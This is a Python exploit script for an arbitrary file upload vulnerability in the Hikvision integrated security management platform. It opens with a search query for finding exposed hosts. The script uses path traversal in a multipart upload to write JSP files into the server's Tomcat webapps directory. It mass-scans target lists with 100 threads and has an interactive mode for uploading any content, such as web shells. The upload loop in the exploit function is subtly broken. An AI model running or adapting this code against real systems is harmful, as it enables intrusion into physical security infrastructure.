#app="HIKVISION-综合安防管理平台"或title="综合安防管理平台"

import requests,sys,argparse,time
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
def banner():
    test = """
            ██╗  ██╗██╗██╗  ██╗██╗   ██╗██╗███████╗██╗ ██████╗ ███╗   ██╗
            ██║  ██║██║██║ ██╔╝██║   ██║██║██╔════╝██║██╔═══██╗████╗  ██║
            ███████║██║█████╔╝ ██║   ██║██║███████╗██║██║   ██║██╔██╗ ██║
            ██╔══██║██║██╔═██╗ ╚██╗ ██╔╝██║╚════██║██║██║   ██║██║╚██╗██║
            ██║  ██║██║██║  ██╗ ╚████╔╝ ██║███████║██║╚██████╔╝██║ ╚████║
            ╚═╝  ╚═╝╚═╝╚═╝  ╚═╝  ╚═══╝  ╚═╝╚══════╝╚═╝ ╚═════╝ ╚═╝  ╚═══╝
                                                                author:秋妤
                                                                date:2024.09.13
                                                                version:1.0
"""
    print(test)

# 主函数模块
def main():
    banner()
    parser = argparse.ArgumentParser(description="This is a HiKVISION 综合安防管理平台 report 任意文件上传vulnerability")
    parser.add_argument('-u','--url',dest='url',type=str,help='Please enter url')
    parser.add_argument('-f','--file',dest='file',type=str,help='Please enter file')

    args = parser.parse_args()
    if args.url and not args.file:
        if poc(args.url):
            exp(args.url)
    elif not args.url and args.file:
        url_list=[]
        with open(args.file, 'r', encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage:\n\t python3 {sys.argv[0]} -h")# print("Usage:\n\t python3 {} -h".format(sys.argv[0]))

headers = {"Content-Type": "multipart/form-data; boundary=----WebKitFormBoundary9PggsiM755PLa54a"}
# poc模块
def poc(target):
    payload ="/svm/api/external/report"
    url = target+payload
    data = "\r\n------WebKitFormBoundary9PggsiM755PLa54a\r\nContent-Disposition: form-data; name=\"file\"; filename=\"../../../../../../../../../../../opt/hikvision/web/components/tomcat85linux64.1/webapps/eportal/new.jsp\"\r\nContent-Type: application/zip\r\n\r\n\r\n<%out.print(\"qiuyv\");%>\r\n\r\n\r\n------WebKitFormBoundary9PggsiM755PLa54a--"
    # proxies = {
    #     'http':'http://127.0.0.1:8080',
    #     'https':'http://127.0.0.1:8080'
    #     }
    try:
        res = requests.post(url=url,headers=headers,data=data,verify=False,timeout=5)
        # match = re.search(r'VIDEO/(\d+\.jsp)',res.text)
        result = target + '/portal/ui/login/..;/..;/new.jsp'
        if  res.status_code == 200 and "qiuyv" in res.text:
            print( f"[+]{target}存在漏洞，文件上传路劲为：{result}")
            with open ('HiKVISION_result.txt','a',encoding='utf-8') as fp:
                fp.write(target+"\n")
                return True
        else :
            print(f"[-] {target}不存在漏洞")
    except Exception as e:
        print(e)


def exp(target):
    print("--------------------正在进行漏洞利用...---------------------")
    time.sleep(2)
    # os.system("cls")
    while True:
        filename = input("请输入你要上传的文件(q--->quit)\n>>>")
        content = input("请输入你要上传的内容:(q--->quit)\n>>>")
        if filename =='q' or content =='q':
            print("-------------正在退出...-------------")
            break
    data = f"\r\n------WebKitFormBoundary9PggsiM755PLa54a\r\nContent-Disposition: form-data; name=\"file\"; filename=\"../../../../../../../../../../../opt/hikvision/web/components/tomcat85linux64.1/webapps/eportal/{filename}\"\r\nContent-Type: application/zip\r\n\r\n\r\n{content}\r\n\r\n\r\n------WebKitFormBoundary9PggsiM755PLa54a--"
    try:
        res = requests.post(url=target+'/center/api/files;.js',headers=headers,data=data,timeout=5,verify=False)
        # match = re.search(r'VIDEO/(\d+\.jsp)',res.text)
        result = f"{target}/portal/ui/login/..;/..;/{filename}"
        if  res.status_code == 200 and content in res.text:
            print( f"[+] Upload successfully,Access path:{result}")
        else:
            print(f"Fail to upload!")
    except:
            print("执行异常,Try again!")

if __name__ == '__main__':
    main()